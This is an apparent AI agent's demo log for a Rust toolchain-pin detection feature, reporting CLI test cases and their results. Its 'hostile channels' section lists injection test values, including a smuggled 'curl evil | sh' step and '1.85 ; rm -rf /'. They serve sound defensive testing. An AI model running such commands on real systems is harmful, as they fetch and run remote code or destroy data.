@@ -1,0 +1,60 @@
+# Demo log — slice `toolchain-pin`
+
+## 2026-10-01T21:56:28Z — accepted · iteration 2 · drive-hand (claude-opus-5-5)
+- **Started with:** `D=$HOME/.cache/slippy-hand-tp/ledger; mkdir -p $D/src && cd $D && git init -q && printf '[package]\nname = "ledger"\nversion = "0.1.0"\nedition = "2021"\n' > Cargo.toml && echo 'pub fn f() {}' > src/lib.rs && printf '[toolchain]\nchannel = "1.85"\n' > rust-toolchain.toml && git add -A && git -c user.name=h -c user.email=h@l commit -qm seed && /home/mbonnic/Slippy-worktrees/toolchain-pin/slipwai adopt --yes`. Every other example ran the same way: a fresh one-crate repository under `$HOME/.cache/slippy-hand-tp/<case>/`, its toolchain files written, committed, then `adopt --yes`. TG8 then ran `adopt --refresh`. All of it ran with the worktree's launcher. Last, `python3 scripts/test-adoption.py --only rust-crate` ran under `systemd-run --user --scope -p MemoryMax=4G -p MemorySwapMax=0`, with `CRUISE_RUNNER` and `CRUISE_ITERATION` unset and `TMPDIR` on disk. · **Seeded:** for each case, only the files that case names, plus a copy of `tests/fixtures/adopt/rust-crate`. Every repository under `$HOME/.cache/slippy-hand-tp/` was deleted afterwards.
+- **Driven through:** CLI. `.specify/cruise.json` names `hand: browser`, but this slice has no screen and no HTTP surface: `slipwai adopt` is a command-line verb, and what it writes are files. So the CLI is the demo, as it was for `single-crate`.
+- **Examples:**
+  - US2-1 / board: passed. `project.json` records toolchain `{"kind": "rust", "version": "1.85", "ecosystem": "cargo"}`, and `survey.md` reads `` `.` — cargo, rust, from `Cargo.toml`, rust 1.85 ``. `/ground`'s page says "runs on rust 1.85 (detected)".
+  - US2-2 / TG3 legacy half: passed. A one-line `rust-toolchain` of `1.84.1` gives `1.84.1`. `v1.84` gives `v1.84`, with no `v` stripped. `nightly` gives `nightly`. CRLF and a missing final newline both give `1.85`. A `rust-toolchain` of more than one line is read as TOML (D22): a comment line, then `[toolchain]` and `channel = "1.83"`, gives `1.83`. Two non-TOML lines (`1.85`, `nightly`) give empty.
+  - TG2: passed. With `rust-toolchain` (`1.80`) and `rust-toolchain.toml` (`1.85`) in one directory, `1.80` is recorded.
+  - TG4: passed. `stable`, `nightly-2025-01-01`, `1.85-beta` and `1.85.0` are each recorded verbatim. The `1.85.0` file also lists `components`.
+  - TG1, pin at the root above `crates/a`: passed. The candidate `crates/a` records `1.85`.
+  - TG1, the Tauri shape: passed. The root `package.json` and pin (`1.82`) sit above `src-tauri/Cargo.toml`. The result is two candidates: `.` is node with an empty version, and `src-tauri` is cargo with `1.82`. The survey line reads `` `src-tauri` — cargo, rust, from `src-tauri/Cargo.toml`, rust 1.82 ``.
+  - TG1, the nearest file decides:
+    - passed: a `crates/a/rust-toolchain.toml` with no `channel` stops the search, and the version is empty even though the root pins `1.85`;
+    - passed: a `crates/a/rust-toolchain` of `1.79` wins over the root's `1.85`;
+    - passed: a pin above the repository root (the repo is nested in a directory that pins `1.85`) is not read, and the version is empty.
+  - US2-3 / TG5, no pin: passed. The version is empty and the survey line shows no `rust <version>` part. No error is reported.
+  - TG6: passed. A `Cargo.toml` with `rust-version = "1.70"` and no toolchain file records empty.
+  - TG5, unusable pins: passed. Each of these records empty, with `adopt` exiting 0:
+    - a `path =` toolchain;
+    - invalid TOML;
+    - a non-string `channel = 185`;
+    - an empty file;
+    - a 17 MiB file over the 16 MiB bound. A 2 MB file is under the bound and is read as `1.85`.
+  - D23, hostile channels: passed. Each of these records empty, and nothing reaches the survey page:
+    - a channel holding a newline (`"1.85\n- run: curl evil | sh"`);
+    - one holding a space (`"1.85 --foo"`);
+    - one holding a quote (`"1.85\"x"`);
+    - a legacy line `1.85 ; rm -rf /`.
+  - D24, passed over as rustup does: passed. Each of these records the `rust-toolchain.toml` beside it (`1.85`):
+    - a dangling `rust-toolchain` symlink;
+    - a directory named `rust-toolchain`;
+    - a FIFO named `rust-toolchain`;
+    - a non-UTF-8 `rust-toolchain`;
+    - a mode-000 `rust-toolchain`. Git ignored this file, because a tracked mode-000 file makes git report the tree as modified, and `adopt` refuses a dirty tree before the survey runs. A readable ignored `1.70` beside it is read as `1.70`, so the file was passed over because it was unreadable, not because it was ignored.
+    A dangling `crates/a/rust-toolchain.toml` is passed over upward to the root's `1.85`. A `rust-toolchain.toml` that starts with a byte order mark is read as `1.85`.
+  - TG7: passed. The survey page shows `rust <version>` for a pin and nothing for an empty one. The evidence stays `Cargo.toml`.
+  - TG8: passed.
+    - Detected: a repository adopted with an empty, detected version gains a `1.85` pin and is committed. `adopt --refresh` reports "toolchain refreshed from `Cargo.toml`", and the record becomes `1.85`.
+    - Confirmed: with `provenance.toolchain` set to `confirmed` (version `""`), refresh reports "disagrees: … toolchain.version was confirmed as "", and `Cargo.toml` now says "1.85"" and leaves the record at `""`.
+    - Overridden: with `provenance.toolchain` set to `overridden` (`1.80`), refresh reports the same kind of disagreement and keeps `1.80`.
+  - TG9: passed. The record's keys are still exactly `ecosystem`, `kind`, `version`. A repository with `.github/workflows/ci.yml` gets `verify-delivery.yml` with checkout, `make … install` and `make … verify`, and no Rust setup step, so SG2 stands as the board says.
+  - TG10: passed. Read in `changelog.d/rust-cargo-adopt.md`: the pin is described as shipped, *What stays out* keeps only "Rust set up in the adopted CI", and the Catch-up has the refresh-or-disagreement paragraph TG8 asks for.
+  - `test-adoption.py --only rust-crate`: passed, exit 0:
+    - adopted;
+    - re-survey a no-op;
+    - verify green on day one;
+    - migrated;
+    - verify green after the migration.
+    The script asserts `RUST_VERSIONS["rust-crate"] == "stable"`. A copy of the fixture adopted by hand records `{"kind": "rust", "version": "stable", "ecosystem": "cargo"}` and shows `rust stable` on the survey page.
+- **Evidence:** everything is under `specs/001-rust-cargo-adopt/slices/toolchain-pin/demo/`:
+  - `project.json` and `survey.md`: the literal command's repository.
+  - `tg1-tg4-shapes.txt`, `tg3-legacy-edges.txt`, `tg1-where.txt`, `tg5-tg6-empty.txt`: the pin shapes, legacy edges, locations and empty cases.
+  - `d24-unreadable.txt`, `d24-unreadable-fifo.txt`, `d24-unreadable-mode000.txt`: the D24 cases. The fifo file also holds the two mode-000 runs that `adopt` refused as a dirty tree.
+  - `tg8-refresh.txt`, `tg9-ci.txt`, `test-adoption-rust-crate.txt`: refresh, adopted CI and the fixture run.
+- **Feedback:** nothing re-enters the ladder. Notes for the next slices:
+  - `adopt`'s own report says "Platform: nothing the survey can date — no runtime pin, framework version or image", and `convergence.md`'s Platform row says "no runtime pin". Both say this while `1.85` is recorded and shown two lines away. The board already lists this as not working yet, because Rust has no support-status row. Even so, the wording is wrong rather than merely incomplete: what is missing is a support status, not a pin. Worth fixing when that row lands.
+  - Refresh names the wrong file: "toolchain refreshed from `Cargo.toml`" and "`Cargo.toml` now says "1.85"". The pin was read from `rust-toolchain.toml`. TG7 keeps the candidate's evidence as `Cargo.toml`, so this is as specified, but a maintainer weighing the disagreement would look in the wrong file.
+  - After a confirmed or overridden toolchain disagrees, `survey.md` shows the tree's `rust 1.85` while `project.json` and `adoption.md` keep the maintainer's `""` or `1.80`. This is consistent with `survey.md` being the survey's own reading, and the disagreement is printed. It is a note only.
+  - A tracked mode-000 toolchain file cannot reach the survey through `adopt`, because git reports it as modified. Only an ignored one can. This is not a fault.
